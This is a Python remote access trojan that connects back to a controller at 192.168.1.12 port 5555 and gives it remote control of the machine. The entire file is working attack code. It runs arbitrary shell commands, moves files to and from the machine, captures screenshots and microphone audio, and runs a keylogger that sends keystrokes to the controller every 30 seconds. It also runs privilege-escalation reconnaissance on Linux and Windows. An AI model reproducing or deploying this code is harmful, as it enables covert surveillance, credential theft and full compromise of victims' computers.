import socket
import time
import subprocess
import json
import os
import threading
import base64
import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write
from pynput import keyboard
import ctypes

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
log = ""
keylogger_running = False

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        s.settimeout(1)
        try:
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        s.settimeout(None)

def screenshot():
    image = pyautogui.screenshot()
    image.save("screen.png")
    upload_file("screen.png")
    os.remove("screen.png")

def record_audio(duration=5):
    fs = 44100
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    write("audio.wav", fs, recording)
    upload_file("audio.wav")
    os.remove("audio.wav")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def windows_priv_esc():
    if not is_admin() and os.name == 'nt':
        try:
            # Method 1: Using token duplication (theoretical example)
            reliable_send("[*] Attempting Windows privilege escalation...")
            
            # Check for vulnerable services
            result = subprocess.run('wmic service get name,pathname,startname', 
                                  shell=True, capture_output=True, text=True)
            reliable_send(result.stdout)
            
            # Check for unquoted service paths
            result = subprocess.run('wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v "\""',
                                  shell=True, capture_output=True, text=True)
            reliable_send("[*] Checking for unquoted service paths:\n" + result.stdout)
            
        except Exception as e:
            reliable_send(f"[-] Privilege escalation failed: {str(e)}")
    else:
        reliable_send("[+] Already running as admin")
        
def linux_priv_esc():
    try:
        # Check current privileges first
        if os.geteuid() == 0:
            reliable_send("[+] Already running as root!")
            return

        reliable_send("[*] Starting Linux privilege escalation checks...")
        
        # 1. Check SUID binaries
        reliable_send("\n[SUID Binaries Check]")
        result = subprocess.run('find / -perm -4000 -type f 2>/dev/null | grep -v "snap"', 
                              shell=True, capture_output=True, text=True)
        reliable_send(result.stdout if result.stdout else "No interesting SUID binaries found")
        
        # 2. Check writable files
        reliable_send("\n[Writable Files Check]")
        result = subprocess.run('find / -writable 2>/dev/null | grep -v "/proc/\|/dev/\|/sys/"', 
                              shell=True, capture_output=True, text=True)
        reliable_send(result.stdout if result.stdout else "No interesting writable locations found")
        
        # 3. Check kernel version
        reliable_send("\n[Kernel Version Check]")
        result = subprocess.run('uname -a; cat /etc/*-release', 
                              shell=True, capture_output=True, text=True)
        reliable_send(result.stdout)
        
        # 4. Check cron jobs
        reliable_send("\n[Cron Jobs Check]")
        result = subprocess.run('ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null', 
                              shell=True, capture_output=True, text=True)
        reliable_send(result.stdout if result.stdout else "No accessible cron jobs found")
        
        # 5. Check environment variables
        reliable_send("\n[Environment Variables Check]")
        result = subprocess.run('env | grep -i "path\|home\|root"', 
                              shell=True, capture_output=True, text=True)
        reliable_send(result.stdout)
        
        reliable_send("\n[+] Privilege escalation checks completed. Review results for potential vectors.")
        
    except Exception as e:
        reliable_send(f"[-] Error during privilege checks: {str(e)}")


def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f"[{key}]"

def start_keylogger():
    global keylogger_running
    if keylogger_running:
        return
    keylogger_running = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    def send_log():
        global log
        while keylogger_running:
            time.sleep(30)
            if log:
                reliable_send(f"[KEYLOG] {log}")
                log = ""
    threading.Thread(target=send_log, daemon=True).start()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command == 'screenshot':
            screenshot()
            reliable_send("[+] Screenshot sent.")
        elif command == 'record_audio':
            record_audio()
            reliable_send("[+] Audio recorded.")
        elif command == 'check_admin':
            reliable_send("[+] Admin" if is_admin() else "[-] Not admin")
        elif command == 'keylog_start':
            start_keylogger()
            reliable_send("[+] Keylogger started.")
        elif command == 'check_priv':
            if os.name == 'posix':
                linux_priv_esc()
            elif os.name == 'nt':
                windows_priv_esc()
        else:
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                reliable_send(result.decode())
            except Exception as e:
                reliable_send(f"[-] Error: {str(e)}")

def connection():
    while True:
        try:
            s.connect(('192.168.1.12', 5555))
            shell()
            s.close()
            break
        except:
            time.sleep(20)

connection()
